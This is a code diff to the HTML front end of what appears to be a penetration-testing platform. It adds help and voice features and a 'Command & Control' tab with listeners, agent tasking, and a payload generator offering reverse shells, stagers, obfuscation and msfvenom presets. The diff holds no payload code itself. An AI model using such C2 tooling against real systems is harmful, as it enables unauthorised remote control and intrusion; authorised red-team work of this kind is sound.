@@ -63,6 +63,29 @@
         .node-label { font-size: 11px; fill: #a3a3a3; text-anchor: middle; }
         .node-ip { font-size: 10px; fill: #666; text-anchor: middle; font-family: monospace; }
         .device-icon { font-size: 24px; }
+        
+        /* Voice Control Styles */
+        .voice-btn { transition: all 0.3s ease; }
+        .voice-btn.listening { background: #dc2626 !important; animation: voice-pulse 1.5s ease-in-out infinite; }
+        .voice-btn.processing { background: #eab308 !important; }
+        @keyframes voice-pulse { 0%, 100% { box-shadow: 0 0 0 0 rgba(220, 38, 38, 0.7); } 50% { box-shadow: 0 0 0 15px rgba(220, 38, 38, 0); } }
+        
+        /* Help Panel Styles */
+        .help-panel { width: 380px; transition: transform 0.3s ease; }
+        .help-panel.hidden { transform: translateX(100%); }
+        .help-message { animation: fadeIn 0.3s ease; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        
+        /* Wizard Styles */
+        .wizard-step { transition: all 0.3s ease; }
+        .wizard-step.active { border-color: #dc2626; background: rgba(220, 38, 38, 0.1); }
+        .wizard-progress { background: linear-gradient(90deg, #dc2626 var(--progress), #3a3a3a var(--progress)); }
+        
+        /* Explain Button Styles */
+        .explain-btn { transition: all 0.2s ease; }
+        .explain-btn:hover { background: rgba(220, 38, 38, 0.2); }
+        .explain-tooltip { animation: tooltipFade 0.2s ease; }
+        @keyframes tooltipFade { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
     </style>
 </head>
 <body class="bg-sp-black text-sp-white">
@@ -170,6 +193,14 @@
                     📋 Scan History
                     <span x-show="scans.length > 0" class="px-2 py-0.5 bg-sp-red/30 rounded-full text-xs" x-text="scans.length"></span>
                 </button>
+                <button @click="activeTab = 'c2'" 
+                        :class="activeTab === 'c2' ? 'border-sp-red text-sp-red bg-sp-grey' : 'border-transparent text-sp-white-muted hover:text-white hover:bg-sp-grey-light'"
+                        class="px-4 py-2 font-medium transition border-b-2 flex items-center gap-2">
+                    ☠️ C2
+                    <span x-show="c2Agents.filter(a => a.status === 'active').length > 0" 
+                          class="px-2 py-0.5 bg-green-500/30 rounded-full text-xs text-green-400" 
+                          x-text="c2Agents.filter(a => a.status === 'active').length"></span>
+                </button>
             </div>
         </header>
 
@@ -224,6 +255,101 @@
                             <span class="font-bold" x-text="countBySeverity('low')"></span>
                         </div>
                     </div>
+                </div>
+
+                <!-- Onboarding & Help Section -->
+                <div class="mt-6 pt-4 border-t border-sp-grey-mid">
+                    <h2 class="text-lg font-semibold mb-4 text-sp-white-dim">🎓 Help & Onboarding</h2>
+                    <div class="space-y-2">
+                        <button @click="showWizard('first_time_setup')" 
+                                x-show="!onboardingComplete"
+                                class="w-full text-left text-sm bg-sp-red/20 hover:bg-sp-red/30 border border-sp-red/50 px-3 py-2 rounded flex items-center gap-2 transition">
+                            <span>🚀</span> 
+                            <span>Getting Started</span>
+                        </button>
+                        <button @click="showWizard('run_scan')" 
+                                class="w-full text-left text-sm bg-sp-grey hover:bg-sp-grey-light px-3 py-2 rounded flex items-center gap-2 transition">
+                            <span>🎯</span> 
+                            <span>Scan Wizard</span>
+                        </button>
+                        <button @click="showWizard('create_operation')" 
+                                class="w-full text-left text-sm bg-sp-grey hover:bg-sp-grey-light px-3 py-2 rounded flex items-center gap-2 transition">
+                            <span>📋</span> 
+                            <span>New Operation</span>
+                        </button>
+                        <button @click="toggleHelpPanel()" 
+                                class="w-full text-left text-sm bg-sp-grey hover:bg-sp-grey-light px-3 py-2 rounded flex items-center gap-2 transition"
+                                :class="showHelpPanel ? 'bg-sp-red/20 border-sp-red' : ''">
+                            <span>💬</span> 
+                            <span>AI Help Chat</span>
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Voice Command Reference -->
+                <div class="mt-4 p-3 bg-sp-grey/50 rounded border border-sp-grey-mid">
+                    <h4 class="text-xs font-semibold text-sp-white-muted mb-2">🎤 Voice Commands</h4>
+                    <div class="text-xs text-sp-white-muted space-y-1">
+                        <p>• "Scan [target]"</p>
+                        <p>• "Show agents"</p>
+                        <p>• "List scans"</p>
+                        <p>• "Help with [topic]"</p>
+                    </div>
+                </div>
+            </aside>
+
+            <!-- Help Chat Panel (Slide-in) -->
+            <aside x-show="showHelpPanel" 
+                   x-transition:enter="transition ease-out duration-300"
+                   x-transition:enter-start="translate-x-full"
+                   x-transition:enter-end="translate-x-0"
+                   x-transition:leave="transition ease-in duration-200"
+                   x-transition:leave-start="translate-x-0"
+                   x-transition:leave-end="translate-x-full"
+                   class="help-panel fixed right-0 top-0 h-full bg-sp-dark border-l border-sp-grey-mid z-40 flex flex-col">
+                <div class="p-4 border-b border-sp-grey-mid flex items-center justify-between">
+                    <h3 class="font-bold text-sp-white flex items-center gap-2">
+                        💬 AI Help Assistant
+                    </h3>
+                    <button @click="showHelpPanel = false" class="text-sp-white-muted hover:text-white">✕</button>
+                </div>
+                
+                <div class="flex-1 overflow-y-auto p-4 space-y-3" id="helpChatContainer">
+                    <template x-for="(msg, idx) in helpMessages" :key="idx">
+                        <div class="help-message" :class="msg.role === 'user' ? 'text-right' : 'text-left'">
+                            <div :class="msg.role === 'user' 
+                                ? 'bg-sp-red inline-block rounded-lg px-3 py-2 text-sm' 
+                                : 'bg-sp-grey inline-block rounded-lg px-3 py-2 text-sm border border-sp-grey-mid'">
+                                <div x-html="renderMarkdown(msg.content)"></div>
+                            </div>
+                        </div>
+                    </template>
+                    <div x-show="helpLoading" class="text-left">
+                        <div class="bg-sp-grey inline-block rounded-lg px-3 py-2 border border-sp-grey-mid">
+                            <div class="typing-indicator flex gap-1">
+                                <span class="w-2 h-2 bg-sp-red rounded-full"></span>
+                                <span class="w-2 h-2 bg-sp-red rounded-full"></span>
+                                <span class="w-2 h-2 bg-sp-red rounded-full"></span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Quick Help Buttons -->
+                <div class="p-3 border-t border-sp-grey-mid">
+                    <div class="flex flex-wrap gap-2 mb-3">
+                        <button @click="askHelp('How do I start?')" class="text-xs bg-sp-grey hover:bg-sp-grey-light px-2 py-1 rounded">🚀 Getting Started</button>
+                        <button @click="askHelp('Explain nmap options')" class="text-xs bg-sp-grey hover:bg-sp-grey-light px-2 py-1 rounded">🔍 Nmap Help</button>
+                        <button @click="askHelp('What are the phases?')" class="text-xs bg-sp-grey hover:bg-sp-grey-light px-2 py-1 rounded">📋 Phases</button>
+                        <button @click="askHelp('Show voice commands')" class="text-xs bg-sp-grey hover:bg-sp-grey-light px-2 py-1 rounded">🎤 Voice</button>
+                    </div>
+                    <form @submit.prevent="sendHelpMessage()" class="flex gap-2">
+                        <input type="text" x-model="helpInput" placeholder="Ask anything..."
+                               class="flex-1 bg-sp-grey border border-sp-grey-mid rounded px-3 py-2 text-sm focus:outline-none focus:ring-1 focus:ring-sp-red">
+                        <button type="submit" class="bg-sp-red hover:bg-sp-red-dark px-3 py-2 rounded text-sm" :disabled="!helpInput.trim()">
+                            Send
+                        </button>
+                    </form>
                 </div>
             </aside>
 
@@ -307,17 +433,47 @@
                     </div>
 
                     <div class="border-t border-sp-grey-mid p-4 bg-sp-dark">
-                        <form @submit.prevent="sendMessage()" class="flex gap-4">
+                        <form @submit.prevent="sendMessage()" class="flex gap-2">
+                            <!-- Voice Control Button -->
+                            <button type="button" 
+                                    @click="toggleVoiceRecording()"
+                                    @keydown.space.prevent="startVoiceRecording()"
+                                    @keyup.space.prevent="stopVoiceRecording()"
+                                    class="voice-btn px-4 py-3 rounded-lg transition flex items-center justify-center"
+                                    :class="{
+                                        'bg-sp-grey hover:bg-sp-grey-light': voiceState === 'idle',
+                                        'listening': voiceState === 'listening',
+                                        'processing': voiceState === 'processing',
+                                        'bg-green-600': voiceState === 'speaking'
+                                    }"
+                                    :title="voiceState === 'idle' ? 'Click or hold Space to speak' : voiceState">
+                                <span x-show="voiceState === 'idle'">🎤</span>
+                                <span x-show="voiceState === 'listening'" class="animate-pulse">🔴</span>
+                                <span x-show="voiceState === 'processing'">⏳</span>
+                                <span x-show="voiceState === 'speaking'">🔊</span>
+                            </button>
                             <input type="text" x-model="userInput" 
                                    :placeholder="getPhasePrompt()"
                                    class="flex-1 bg-sp-grey border border-sp-grey-mid rounded-lg px-4 py-3 focus:outline-none focus:ring-2 focus:ring-sp-red focus:border-transparent text-sp-white placeholder-sp-white-muted"
                                    :disabled="isLoading">
+                            <!-- Explain Button for Input -->
+                            <button type="button" 
+                                    @click="explainInput()"
+                                    class="explain-btn bg-sp-grey hover:bg-sp-grey-light px-3 py-3 rounded-lg transition"
+                                    :disabled="!userInput.trim()"
+                                    title="Get help with this command">
+                                ❓
+                            </button>
                             <button type="submit" 
                                     class="bg-sp-red hover:bg-sp-red-dark disabled:bg-sp-grey-mid px-6 py-3 rounded-lg font-semibold transition text-white"
                                     :disabled="isLoading || !userInput.trim()">
                                 Send
                             </button>
                         </form>
+                        <!-- Voice Transcript Display -->
+                        <div x-show="voiceTranscript" x-transition class="mt-2 p-2 bg-sp-grey/50 rounded text-sm text-sp-white-muted">
+                            <span class="text-sp-red">🎤 Heard:</span> <span x-text="voiceTranscript"></span>
+                        </div>
                     </div>
                 </div>
 
@@ -341,10 +497,20 @@
                                     <template x-if="line.type === 'info'">
                                         <div class="text-sp-white-muted italic" x-text="line.content"></div>
                                     </template>
+                                    <template x-if="line.type === 'keepalive'">
+                                        <div class="text-yellow-500 italic flex items-center gap-2">
+                                            <svg class="animate-spin h-4 w-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                                                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                                                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                                            </svg>
+                                            <span x-text="line.content"></span>
+                                        </div>
+                                    </template>
                                 </div>
                             </template>
-                            <div x-show="terminalLoading" class="text-sp-red animate-pulse">
-                                Executing command...
+                            <div x-show="terminalLoading" class="text-sp-red animate-pulse flex items-center gap-2">
+                                <span class="inline-block w-2 h-2 bg-sp-red rounded-full animate-ping"></span>
+                                <span x-text="terminalStreaming ? 'Streaming output...' : 'Executing command...'"></span>
                             </div>
                         </div>
                     </div>
@@ -360,12 +526,22 @@
                                    :disabled="terminalLoading"
                                    @keyup.up="historyUp()"
                                    @keyup.down="historyDown()">
-                            <button type="submit" 
+                            <button x-show="!terminalStreaming"
+                                    type="submit" 
                                     class="bg-sp-red hover:bg-sp-red-dark disabled:bg-sp-grey-mid px-4 py-2 rounded font-semibold transition text-white"
                                     :disabled="terminalLoading || !terminalInput.trim()">
                                 Run
                             </button>
+                            <button x-show="terminalStreaming"
+                                    type="button"
+                                    @click="cancelCommand()"
+                                    class="bg-yellow-600 hover:bg-yellow-700 px-4 py-2 rounded font-semibold transition text-white">
+                                Cancel
+                            </button>
                         </form>
+                        <p x-show="terminalStreaming" class="text-xs text-sp-white-muted mt-2">
+                            💡 Output is streaming in real-time. Click Cancel to stop the command.
+                        </p>
                     </div>
                 </div>
 
@@ -458,33 +634,49 @@
                         </div>
                     </div>
 
-                    <!-- Legend -->
+                    <!-- Legend (Clickable Filters) -->
                     <div class="p-3 bg-sp-dark border-b border-sp-grey-mid flex items-center gap-6 text-sm">
-                        <span class="text-sp-white-muted">Legend:</span>
-                        <div class="flex items-center gap-2">
+                        <span class="text-sp-white-muted">Filter:</span>
+                        <button @click="toggleOsFilter('Windows')" 
+                                :class="osFilters.includes('Windows') ? 'bg-sp-red ring-2 ring-sp-red-light' : 'hover:bg-sp-grey-light'"
+                                class="flex items-center gap-2 px-2 py-1 rounded transition cursor-pointer">
                             <span class="text-2xl">🪟</span>
-                            <span class="text-sp-white-muted">Windows</span>
-                        </div>
-                        <div class="flex items-center gap-2">
+                            <span :class="osFilters.includes('Windows') ? 'text-white' : 'text-sp-white-muted'">Windows</span>
+                        </button>
+                        <button @click="toggleOsFilter('Linux')" 
+                                :class="osFilters.includes('Linux') ? 'bg-sp-red ring-2 ring-sp-red-light' : 'hover:bg-sp-grey-light'"
+                                class="flex items-center gap-2 px-2 py-1 rounded transition cursor-pointer">
                             <span class="text-2xl">🐧</span>
-                            <span class="text-sp-white-muted">Linux</span>
-                        </div>
-                        <div class="flex items-center gap-2">
+                            <span :class="osFilters.includes('Linux') ? 'text-white' : 'text-sp-white-muted'">Linux</span>
+                        </button>
+                        <button @click="toggleOsFilter('macOS')" 
+                                :class="osFilters.includes('macOS') ? 'bg-sp-red ring-2 ring-sp-red-light' : 'hover:bg-sp-grey-light'"
+                                class="flex items-center gap-2 px-2 py-1 rounded transition cursor-pointer">
                             <span class="text-2xl">🍎</span>
-                            <span class="text-sp-white-muted">macOS</span>
-                        </div>
-                        <div class="flex items-center gap-2">
+                            <span :class="osFilters.includes('macOS') ? 'text-white' : 'text-sp-white-muted'">macOS</span>
+                        </button>
+                        <button @click="toggleOsFilter('router')" 
+                                :class="osFilters.includes('router') ? 'bg-sp-red ring-2 ring-sp-red-light' : 'hover:bg-sp-grey-light'"
+                                class="flex items-center gap-2 px-2 py-1 rounded transition cursor-pointer">
                             <span class="text-2xl">📡</span>
-                            <span class="text-sp-white-muted">Network Device</span>
-                        </div>
-                        <div class="flex items-center gap-2">
+                            <span :class="osFilters.includes('router') ? 'text-white' : 'text-sp-white-muted'">Network</span>
+                        </button>
+                        <button @click="toggleOsFilter('server')" 
+                                :class="osFilters.includes('server') ? 'bg-sp-red ring-2 ring-sp-red-light' : 'hover:bg-sp-grey-light'"
+                                class="flex items-center gap-2 px-2 py-1 rounded transition cursor-pointer">
                             <span class="text-2xl">🖥️</span>
-                            <span class="text-sp-white-muted">Server</span>
-                        </div>
-                        <div class="flex items-center gap-2">
+                            <span :class="osFilters.includes('server') ? 'text-white' : 'text-sp-white-muted'">Server</span>
+                        </button>
+                        <button @click="toggleOsFilter('unknown')" 
+                                :class="osFilters.includes('unknown') ? 'bg-sp-red ring-2 ring-sp-red-light' : 'hover:bg-sp-grey-light'"
+                                class="flex items-center gap-2 px-2 py-1 rounded transition cursor-pointer">
                             <span class="text-2xl">❓</span>
-                            <span class="text-sp-white-muted">Unknown</span>
-                        </div>
+                            <span :class="osFilters.includes('unknown') ? 'text-white' : 'text-sp-white-muted'">Unknown</span>
+                        </button>
+                        <button x-show="osFilters.length > 0" @click="osFilters = []; renderNetworkMap()" 
+                                class="ml-2 text-sp-red hover:text-sp-red-light text-xs">
+                            ✕ Clear filters
+                        </button>
                     </div>
 
                     <div x-show="networkHosts.length === 0 && !networkMapLoading" class="flex-1 flex items-center justify-center">
@@ -620,6 +812,309 @@
                                               class="text-xs bg-sp-grey px-2 py-0.5 rounded"
                                               x-text="host.ports.length + ' ports'"></span>
                                     </div>
+                                </div>
+                            </template>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- C2 Command & Control Tab -->
+                <div x-show="activeTab === 'c2'" class="flex-1 flex flex-col overflow-hidden">
+                    <div class="p-4 border-b border-sp-grey-mid flex justify-between items-center">
+                        <h2 class="text-lg font-bold text-sp-white flex items-center gap-2">
+                            ☠️ Command & Control
+                            <span class="text-sm font-normal text-sp-white-muted">Post-Exploitation Framework</span>
+                        </h2>
+                        <div class="flex gap-2">
+                            <button @click="c2ActivePanel = 'listeners'" 
+                                    :class="c2ActivePanel === 'listeners' ? 'bg-sp-red' : 'bg-sp-grey hover:bg-sp-grey-light'"
+                                    class="px-3 py-1.5 rounded text-sm transition">📡 Listeners</button>
+                            <button @click="c2ActivePanel = 'agents'" 
+                                    :class="c2ActivePanel === 'agents' ? 'bg-sp-red' : 'bg-sp-grey hover:bg-sp-grey-light'"
+                                    class="px-3 py-1.5 rounded text-sm transition">🤖 Agents</button>
+                            <button @click="c2ActivePanel = 'payloads'" 
+                                    :class="c2ActivePanel === 'payloads' ? 'bg-sp-red' : 'bg-sp-grey hover:bg-sp-grey-light'"
+                                    class="px-3 py-1.5 rounded text-sm transition">💾 Payloads</button>
+                            <button @click="c2ActivePanel = 'tasks'" 
+                                    :class="c2ActivePanel === 'tasks' ? 'bg-sp-red' : 'bg-sp-grey hover:bg-sp-grey-light'"
+                                    class="px-3 py-1.5 rounded text-sm transition">📋 Tasks</button>
+                        </div>
+                    </div>
+
+                    <!-- Listeners Panel -->
+                    <div x-show="c2ActivePanel === 'listeners'" class="flex-1 overflow-auto p-4">
+                        <div class="flex justify-between items-center mb-4">
+                            <h3 class="font-semibold text-sp-white">Active Listeners</h3>
+                            <button @click="showListenerModal = true" 
+                                    class="bg-sp-red hover:bg-sp-red-dark px-4 py-2 rounded text-sm transition flex items-center gap-2">
+                                ➕ New Listener
+                            </button>
+                        </div>
+                        
+                        <div x-show="c2Listeners.length === 0" class="text-center py-12 text-sp-white-muted">
+                            <p class="text-5xl mb-4">📡</p>
+                            <p>No listeners configured</p>
+                            <p class="text-sm mt-2">Create a listener to receive agent callbacks</p>
+                        </div>
+                        
+                        <div class="grid gap-3">
+                            <template x-for="listener in c2Listeners" :key="listener.id">
+                                <div class="bg-sp-grey border border-sp-grey-mid rounded-lg p-4 hover:border-sp-red/50 transition">
+                                    <div class="flex items-center justify-between mb-3">
+                                        <div class="flex items-center gap-3">
+                                            <span :class="listener.status === 'running' ? 'bg-green-500 animate-pulse' : 'bg-sp-red'" 
+                                                  class="w-3 h-3 rounded-full"></span>
+                                            <span class="font-mono font-bold text-sp-red" x-text="listener.name"></span>
+                                            <span class="px-2 py-0.5 bg-sp-dark rounded text-xs" x-text="listener.type"></span>
+                                        </div>
+                                        <div class="flex items-center gap-2">
+                                            <button @click="toggleListener(listener)" 
+                                                    :class="listener.status === 'running' ? 'bg-yellow-600 hover:bg-yellow-700' : 'bg-green-600 hover:bg-green-700'"
+                                                    class="px-3 py-1 rounded text-xs transition"
+                                                    x-text="listener.status === 'running' ? '⏸️ Stop' : '▶️ Start'"></button>
+                                            <button @click="deleteListener(listener.id)" 
+                                                    class="bg-sp-grey hover:bg-red-900/50 px-3 py-1 rounded text-xs transition">🗑️</button>
+                                        </div>
+                                    </div>
+                                    <div class="grid grid-cols-4 gap-4 text-sm">
+                                        <div><span class="text-sp-white-muted">Bind:</span> <span class="font-mono" x-text="listener.host + ':' + listener.port"></span></div>
+                                        <div><span class="text-sp-white-muted">Protocol:</span> <span x-text="listener.protocol"></span></div>
+                                        <div><span class="text-sp-white-muted">Connections:</span> <span class="text-green-400" x-text="listener.connections || 0"></span></div>
+                                        <div><span class="text-sp-white-muted">Started:</span> <span x-text="listener.started_at || 'N/A'"></span></div>
+                                    </div>
+                                </div>
+                            </template>
+                        </div>
+                    </div>
+
+                    <!-- Agents Panel -->
+                    <div x-show="c2ActivePanel === 'agents'" class="flex-1 overflow-auto p-4">
+                        <div class="flex justify-between items-center mb-4">
+                            <h3 class="font-semibold text-sp-white">Connected Agents (<span x-text="c2Agents.filter(a => a.status === 'active').length"></span> active)</h3>
+                            <button @click="refreshAgents()" class="bg-sp-grey hover:bg-sp-grey-light px-4 py-2 rounded text-sm transition">🔄 Refresh</button>
+                        </div>
+                        
+                        <div x-show="c2Agents.length === 0" class="text-center py-12 text-sp-white-muted">
+                            <p class="text-5xl mb-4">🤖</p>
+                            <p>No agents connected</p>
+                            <p class="text-sm mt-2">Deploy a payload to establish agent connections</p>
+                        </div>
+                        
+                        <div class="space-y-3">
+                            <template x-for="agent in c2Agents" :key="agent.id">
+                                <div class="bg-sp-grey border border-sp-grey-mid rounded-lg overflow-hidden hover:border-sp-red/50 transition"
+                                     :class="selectedAgent?.id === agent.id ? 'border-sp-red' : ''">
+                                    <div class="p-4">
+                                        <div class="flex items-center justify-between mb-3">
+                                            <div class="flex items-center gap-3">
+                                                <span :class="{
+                                                    'bg-green-500 animate-pulse': agent.status === 'active',
+                                                    'bg-yellow-500': agent.status === 'sleeping',
+                                                    'bg-sp-red': agent.status === 'dead'
+                                                }" class="w-3 h-3 rounded-full"></span>
+                                                <span class="font-mono font-bold text-sp-red" x-text="agent.hostname"></span>
+                                                <span class="text-sp-white-muted">@</span>
+                                                <span class="font-mono" x-text="agent.username"></span>
+                                                <span x-show="agent.elevated" class="px-2 py-0.5 bg-yellow-500/20 text-yellow-400 rounded text-xs">👑 ADMIN</span>
+                                            </div>
+                                            <div class="flex items-center gap-2">
+                                                <span class="text-xs text-sp-white-muted" x-text="'Last seen: ' + agent.last_seen"></span>
+                                                <span :class="{
+                                                    'bg-green-500/20 text-green-400': agent.status === 'active',
+                                                    'bg-yellow-500/20 text-yellow-400': agent.status === 'sleeping',
+                                                    'bg-red-500/20 text-red-400': agent.status === 'dead'
+                                                }" class="px-2 py-1 rounded text-xs font-semibold" x-text="agent.status"></span>
+                                            </div>
+                                        </div>
+                                        <div class="grid grid-cols-5 gap-4 text-sm">
+                                            <div><span class="text-sp-white-muted">IP:</span> <span class="font-mono" x-text="agent.ip"></span></div>
+                                            <div><span class="text-sp-white-muted">OS:</span> <span x-text="agent.os"></span></div>
+                                            <div><span class="text-sp-white-muted">Arch:</span> <span x-text="agent.arch"></span></div>
+                                            <div><span class="text-sp-white-muted">PID:</span> <span class="font-mono" x-text="agent.pid"></span></div>
+                                            <div><span class="text-sp-white-muted">Sleep:</span> <span x-text="agent.sleep + 's'"></span></div>
+                                        </div>
+                                    </div>
+                                    <div class="border-t border-sp-grey-mid px-4 py-2 bg-sp-dark flex gap-2">
+                                        <button @click="interactAgent(agent)" 
+                                                class="flex-1 bg-sp-red hover:bg-sp-red-dark px-3 py-2 rounded text-xs transition">💻 Interact</button>
+                                        <button @click="taskAgent(agent, 'shell', 'whoami')" 
+                                                class="bg-sp-grey hover:bg-sp-grey-light px-3 py-2 rounded text-xs transition">👤 Whoami</button>
+                                        <button @click="taskAgent(agent, 'shell', 'pwd')" 
+                                                class="bg-sp-grey hover:bg-sp-grey-light px-3 py-2 rounded text-xs transition">📁 PWD</button>
+                                        <button @click="taskAgent(agent, 'ps')" 
+                                                class="bg-sp-grey hover:bg-sp-grey-light px-3 py-2 rounded text-xs transition">📊 PS</button>
+                                        <button @click="killAgent(agent.id)" 
+                                                class="bg-sp-grey hover:bg-red-900/50 px-3 py-2 rounded text-xs transition">☠️ Kill</button>
+                                    </div>
+                                </div>
+                            </template>
+                        </div>
+                    </div>
+
+                    <!-- Payloads Panel -->
+                    <div x-show="c2ActivePanel === 'payloads'" class="flex-1 overflow-auto p-4">
+                        <div class="flex justify-between items-center mb-4">
+                            <h3 class="font-semibold text-sp-white">Payload Generator</h3>
+                        </div>
+                        
+                        <div class="grid grid-cols-2 gap-6">
+                            <!-- Payload Options -->
+                            <div class="space-y-4">
+                                <div>
+                                    <label class="block text-sm text-sp-white-muted mb-2">Payload Type</label>
+                                    <select x-model="payloadOptions.type" 
+                                            class="w-full bg-sp-grey border border-sp-grey-mid rounded px-4 py-2 text-sp-white focus:outline-none focus:ring-2 focus:ring-sp-red">
+                                        <option value="reverse_shell">🐚 Reverse Shell</option>
+                                        <option value="bind_shell">🔗 Bind Shell</option>
+                                        <option value="meterpreter">💉 Meterpreter</option>
+                                        <option value="beacon">📡 Beacon (HTTP/S)</option>
+                                        <option value="powershell">⚡ PowerShell Stager</option>
+                                        <option value="python">🐍 Python Stager</option>
+                                    </select>
+                                </div>
+                                <div>
+                                    <label class="block text-sm text-sp-white-muted mb-2">Listener</label>
+                                    <select x-model="payloadOptions.listener" 
+                                            class="w-full bg-sp-grey border border-sp-grey-mid rounded px-4 py-2 text-sp-white focus:outline-none focus:ring-2 focus:ring-sp-red">
+                                        <option value="">-- Select Listener --</option>
+                                        <template x-for="l in c2Listeners" :key="l.id">
+                                            <option :value="l.id" x-text="l.name + ' (' + l.host + ':' + l.port + ')'"></option>
+                                        </template>
+                                    </select>
+                                </div>
+                                <div class="grid grid-cols-2 gap-4">
+                                    <div>
+                                        <label class="block text-sm text-sp-white-muted mb-2">LHOST</label>
+                                        <input type="text" x-model="payloadOptions.lhost" placeholder="10.10.14.1"
+                                               class="w-full bg-sp-grey border border-sp-grey-mid rounded px-4 py-2 text-sp-white focus:outline-none focus:ring-2 focus:ring-sp-red font-mono">
+                                    </div>
+                                    <div>
+                                        <label class="block text-sm text-sp-white-muted mb-2">LPORT</label>
+                                        <input type="number" x-model="payloadOptions.lport" placeholder="4444"
+                                               class="w-full bg-sp-grey border border-sp-grey-mid rounded px-4 py-2 text-sp-white focus:outline-none focus:ring-2 focus:ring-sp-red font-mono">
+                                    </div>
+                                </div>
+                                <div>
+                                    <label class="block text-sm text-sp-white-muted mb-2">Target OS</label>
+                                    <select x-model="payloadOptions.os" 
+                                            class="w-full bg-sp-grey border border-sp-grey-mid rounded px-4 py-2 text-sp-white focus:outline-none focus:ring-2 focus:ring-sp-red">
+                                        <option value="linux">🐧 Linux</option>
+                                        <option value="windows">🪟 Windows</option>
+                                        <option value="macos">🍎 macOS</option>
+                                    </select>
+                                </div>
+                                <div>
+                                    <label class="block text-sm text-sp-white-muted mb-2">Architecture</label>
+                                    <select x-model="payloadOptions.arch" 
+                                            class="w-full bg-sp-grey border border-sp-grey-mid rounded px-4 py-2 text-sp-white focus:outline-none focus:ring-2 focus:ring-sp-red">
+                                        <option value="x64">x64</option>
+                                        <option value="x86">x86</option>
+                                        <option value="arm64">ARM64</option>
+                                    </select>
+                                </div>
+                                <div>
+                                    <label class="block text-sm text-sp-white-muted mb-2">Output Format</label>
+                                    <select x-model="payloadOptions.format" 
+                                            class="w-full bg-sp-grey border border-sp-grey-mid rounded px-4 py-2 text-sp-white focus:outline-none focus:ring-2 focus:ring-sp-red">
+                                        <option value="raw">Raw Shellcode</option>
+                                        <option value="exe">EXE Binary</option>
+                                        <option value="elf">ELF Binary</option>
+                                        <option value="dll">DLL</option>
+                                        <option value="ps1">PowerShell Script</option>
+                                        <option value="py">Python Script</option>
+                                        <option value="base64">Base64 Encoded</option>
+                                    </select>
+                                </div>
+                                <div class="flex items-center gap-4">
+                                    <label class="flex items-center gap-2 cursor-pointer">
+                                        <input type="checkbox" x-model="payloadOptions.encode" class="rounded bg-sp-grey border-sp-grey-mid text-sp-red focus:ring-sp-red">
+                                        <span class="text-sm text-sp-white-muted">Encode payload</span>
+                                    </label>
+                                    <label class="flex items-center gap-2 cursor-pointer">
+                                        <input type="checkbox" x-model="payloadOptions.obfuscate" class="rounded bg-sp-grey border-sp-grey-mid text-sp-red focus:ring-sp-red">
+                                        <span class="text-sm text-sp-white-muted">Obfuscate</span>
+                                    </label>
+                                </div>
+                                <button @click="generatePayload()" 
+                                        class="w-full bg-sp-red hover:bg-sp-red-dark px-4 py-3 rounded font-semibold transition flex items-center justify-center gap-2">
+                                    ⚡ Generate Payload
+                                </button>
+                            </div>
+                            
+                            <!-- Generated Payload -->
+                            <div class="space-y-4">
+                                <div>
+                                    <label class="block text-sm text-sp-white-muted mb-2">Generated Payload</label>
+                                    <pre class="bg-sp-black border border-sp-grey-mid rounded p-4 h-64 overflow-auto text-sm font-mono text-green-400" x-text="generatedPayload || '// Payload will appear here...'"></pre>
+                                </div>
+                                <div class="flex gap-2">
+                                    <button @click="copyPayload()" 
+                                            :disabled="!generatedPayload"
+                                            class="flex-1 bg-sp-grey hover:bg-sp-grey-light px-4 py-2 rounded transition disabled:opacity-50">📋 Copy</button>
+                                    <button @click="downloadPayload()" 
+                                            :disabled="!generatedPayload"
+                                            class="flex-1 bg-sp-grey hover:bg-sp-grey-light px-4 py-2 rounded transition disabled:opacity-50">⬇️ Download</button>
+                                    <button @click="sendToTerminal()" 
+                                            :disabled="!generatedPayload"
+                                            class="flex-1 bg-sp-grey hover:bg-sp-grey-light px-4 py-2 rounded transition disabled:opacity-50">🖥️ Terminal</button>
+                                </div>
+                                
+                                <div class="bg-sp-dark border border-sp-grey-mid rounded p-4">
+                                    <h4 class="font-semibold mb-3 text-sp-white">Quick Payloads</h4>
+                                    <div class="grid grid-cols-2 gap-2 text-sm">
+                                        <button @click="quickPayload('bash_reverse')" class="bg-sp-grey hover:bg-sp-grey-light p-2 rounded text-left">🐚 Bash Reverse</button>
+                                        <button @click="quickPayload('nc_reverse')" class="bg-sp-grey hover:bg-sp-grey-light p-2 rounded text-left">🔌 Netcat Reverse</button>
+                                        <button @click="quickPayload('python_reverse')" class="bg-sp-grey hover:bg-sp-grey-light p-2 rounded text-left">🐍 Python Reverse</button>
+                                        <button @click="quickPayload('powershell_reverse')" class="bg-sp-grey hover:bg-sp-grey-light p-2 rounded text-left">⚡ PowerShell Reverse</button>
+                                        <button @click="quickPayload('php_reverse')" class="bg-sp-grey hover:bg-sp-grey-light p-2 rounded text-left">🐘 PHP Reverse</button>
+                                        <button @click="quickPayload('msfvenom')" class="bg-sp-grey hover:bg-sp-grey-light p-2 rounded text-left">💉 MSFVenom Command</button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Tasks Panel -->
+                    <div x-show="c2ActivePanel === 'tasks'" class="flex-1 overflow-auto p-4">
+                        <div class="flex justify-between items-center mb-4">
+                            <h3 class="font-semibold text-sp-white">Task Queue</h3>
+                            <div class="flex gap-2">
+                                <button @click="clearCompletedTasks()" class="bg-sp-grey hover:bg-sp-grey-light px-4 py-2 rounded text-sm transition">🧹 Clear Completed</button>
+                                <button @click="refreshTasks()" class="bg-sp-grey hover:bg-sp-grey-light px-4 py-2 rounded text-sm transition">🔄 Refresh</button>
+                            </div>
+                        </div>
+                        
+                        <div x-show="c2Tasks.length === 0" class="text-center py-12 text-sp-white-muted">
+                            <p class="text-5xl mb-4">📋</p>
+                            <p>No tasks in queue</p>
